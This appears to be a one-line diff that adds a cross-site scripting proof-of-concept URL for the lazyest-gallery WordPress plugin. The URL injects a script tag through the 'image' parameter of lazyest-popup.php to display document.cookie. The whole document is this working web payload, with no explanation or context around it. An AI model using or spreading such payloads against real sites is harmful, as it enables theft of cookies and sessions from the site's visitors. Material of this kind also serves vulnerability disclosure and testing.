@@ -1,0 +1,1 @@
+http://www.example.com/wp-content/plugins/lazyest-gallery/lazyest-popup.php?image=%3C/title%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
